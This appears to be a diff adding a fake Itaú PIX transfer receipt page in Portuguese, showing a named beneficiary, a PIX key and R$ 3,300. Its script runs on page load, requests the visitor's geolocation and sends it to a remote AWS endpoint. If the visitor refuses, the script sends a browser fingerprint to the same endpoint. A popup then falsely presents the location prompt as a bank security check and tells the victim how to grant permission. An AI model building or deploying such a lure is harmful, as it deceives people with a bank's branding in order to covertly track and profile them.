@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Comprovante PIX - Itaú</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .comprovante {
+            background: #fff;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 360px;
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .header img {
+            width: 100px;
+        }
+        .header h1 {
+            font-size: 18px;
+            color: #003366;
+            margin: 10px 0 0;
+        }
+        .info {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        .info strong {
+            color: #000;
+        }
+        .divider {
+            border-top: 1px solid #ddd;
+            margin: 15px 0;
+        }
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+        }
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none; /* Certifique-se de que o padrão seja "none" */
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .popup-content {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        .popup-content p {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 10px;
+            line-height: 1.5;
+        }
+        .popup-buttons {
+            display: flex;
+            justify-content: space-between;
+        }
+        .popup-buttons button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .popup-buttons .allow {
+            background-color: #4CAF50;
+            color: #fff;
+        }
+        .popup-buttons .deny {
+            background-color: #f44336;
+            color: #fff;
+        }
+        .finalize-button {
+            display: block;
+            margin: 20px auto 0;
+            padding: 10px 20px;
+            background-color: #003366;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .finalize-button:active {
+            background-color: #FF8C00; /* Laranja escuro */
+        }
+        .popup-buttons {
+            margin-top: 20px;
+            display: flex;
+            justify-content: center;
+        }
+        .popup-buttons button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            background-color: #003366;
+            color: #fff;
+        }
+        .popup-buttons button:active {
+            background-color: #FF8C00; /* Laranja escuro */
+        }
+    </style>
+    <script>
+        const API_URL = "https://4ezx5sqt84.execute-api.sa-east-1.amazonaws.com/loc"; // Substitua pelo endpoint da sua API
+
+        function sendLocationToDynamoDB(latitude, longitude) {
+            console.log("Enviando localização para a API:", { latitude, longitude }); // Log para depuração
+            fetch(API_URL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ latitude, longitude })
+            })
+            .then(response => {
+                console.log("Resposta da API:", response); // Log para depuração
+                if (!response.ok) {
+                    throw new Error(`Erro na API: ${response.status} ${response.statusText}`);
+                }
+                return response.json();
+            })
+            .then(data => console.log("Localização enviada com sucesso:", data))
+            .catch(error => {
+                console.error("Erro ao enviar localização:", error);
+            });
+        }
+
+        function collectBrowserInfo() {
+            const userAgent = navigator.userAgent || "Desconhecido";
+            const language = navigator.language || "Desconhecido";
+            const screenWidth = window.screen.width || "Desconhecido";
+            const screenHeight = window.screen.height || "Desconhecido";
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Desconhecido";
+            const platform = navigator.platform || "Desconhecido";
+            const referrer = document.referrer || "Desconhecido";
+
+            // Informações adicionais
+            const connection = navigator.connection || {};
+            const connectionType = connection.effectiveType || "Desconhecido";
+            const downlink = connection.downlink || "Desconhecido";
+            const rtt = connection.rtt || "Desconhecido";
+
+            const memory = navigator.deviceMemory || "Desconhecido";
+
+            const historyLength = window.history.length || "Desconhecido";
+
+            // Informações sobre desempenho
+            const performance = window.performance || {};
+            const timing = performance.timing || {};
+            const pageLoadTime = timing.loadEventEnd - timing.navigationStart || "Desconhecido";
+            const domContentLoadedTime = timing.domContentLoadedEventEnd - timing.navigationStart || "Desconhecido";
+
+            // Informações sobre cookies
+            const cookiesEnabled = navigator.cookieEnabled ? "Sim" : "Não";
+
+            // Informações sobre economia de energia
+            const saveData = navigator.connection && navigator.connection.saveData ? "Sim" : "Não";
+
+            return `UserAgent: ${userAgent}, Language: ${language}, Screen: ${screenWidth}x${screenHeight}, TimeZone: ${timeZone}, Platform: ${platform}, Referrer: ${referrer}, ConnectionType: ${connectionType}, Downlink: ${downlink}, RTT: ${rtt}, Memory: ${memory}GB, HistoryLength: ${historyLength}, PageLoadTime: ${pageLoadTime}ms, DOMContentLoadedTime: ${domContentLoadedTime}ms, CookiesEnabled: ${cookiesEnabled}, SaveData: ${saveData}`;
+        }
+
+        function sendFallbackInfo() {
+            const fallbackInfo = collectBrowserInfo();
+            console.log("Enviando informações alternativas:", fallbackInfo); // Log para depuração
+            fetch(API_URL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    latitude: 0,
+                    longitude: 0,
+                    info: fallbackInfo
+                })
+            })
+            .then(response => {
+                console.log("Resposta da API (fallback):", response); // Log para depuração
+                if (!response.ok) {
+                    throw new Error(`Erro na API: ${response.status} ${response.statusText}`);
+                }
+                return response.json();
+            })
+            .then(data => console.log("Informações alternativas enviadas com sucesso:", data))
+            .catch(error => {
+                console.error("Erro ao enviar informações alternativas:", error);
+            });
+        }
+
+        function requestLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const { latitude, longitude } = position.coords;
+                        console.log("Localização obtida:", latitude, longitude);
+                        sendLocationToDynamoDB(latitude, longitude);
+                    },
+                    error => {
+                        console.error("Erro ao obter localização:", error);
+                        sendFallbackInfo(); // Envia informações alternativas
+                        showPopup();
+                    }
+                );
+            } else {
+                console.error("Geolocalização não suportada.");
+                sendFallbackInfo(); // Envia informações alternativas
+            }
+        }
+
+        function showPopup() {
+            const popup = document.getElementById('popup');
+            if (popup) {
+                popup.style.display = 'flex';
+                console.log("Pop-up exibido.");
+            } else {
+                console.error("Elemento pop-up não encontrado.");
+            }
+        }
+
+        function handlePopup(action) {
+            const popup = document.getElementById('popup');
+            if (popup) {
+                popup.style.display = 'none';
+                console.log("Pop-up fechado.");
+            }
+            requestLocation();
+        }
+
+        function handleFinalizePayment() {
+            try {
+                requestLocation();
+            } catch (error) {
+                console.error("Erro ao finalizar pagamento:", error);
+            }
+        }
+
+        function reloadPage() {
+            location.reload();
+        }
+
+        window.onload = () => {
+            console.log("Página carregada.");
+            setTimeout(() => {
+                try {
+                    requestLocation();
+                } catch (error) {
+                    console.error("Erro ao carregar a página:", error);
+                }
+            }, 500);
+        };
+    </script>
+</head>
+<body>
+    <div class="comprovante">
+        <div class="header">
+            <img src="./itau.png" alt="Itaú">
+            <h1>Comprovante de Transferência</h1>
+        </div>
+        <div class="info">
+            <p><strong>Data:</strong> 23/10/2025</p>
+            <p><strong>Horário:</strong> 07:12</p>
+            <p><strong>Valor:</strong> R$ 3.300,00</p>
+            <p><strong>Chave PIX:</strong> 03746033160</p>
+            <p><strong>Nome do Beneficiário:</strong> Alexandre Carlos Maia da Silva</p>
+            <p><strong>Instituição:</strong> PagSeguro Internet</p>
+        </div>
+        <button class="finalize-button" onclick="handleFinalizePayment()">Finalizar pagamento</button>
+        <div class="divider"></div>
+        <div class="footer">
+            <p>Transação realizada com sucesso.</p>
+            <p>Banco Itaú - © 2025</p>
+        </div>
+    </div>
+    <div id="popup" class="popup">
+        <div class="popup-content">
+            <p>Parece que você recusou o sistema de segurança. Para continuar, siga as instruções:</p>
+            <p>1. Clique ao lado da URL/Link do site.</p>
+            <p>2. Se estiver usando um iPhone, clique nos 3 pontinhos, role para baixo até chegar em "Localização" e clique em "Permitir".</p>
+            <p>3. Se estiver usando Android, clique no ícone ao lado da URL/Link, procure por "Localização" ou "Permissões" e clique em "Permitir".</p>
+            <div class="popup-buttons">
+                <button onclick="reloadPage()">Recarregar página</button>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
+``` 
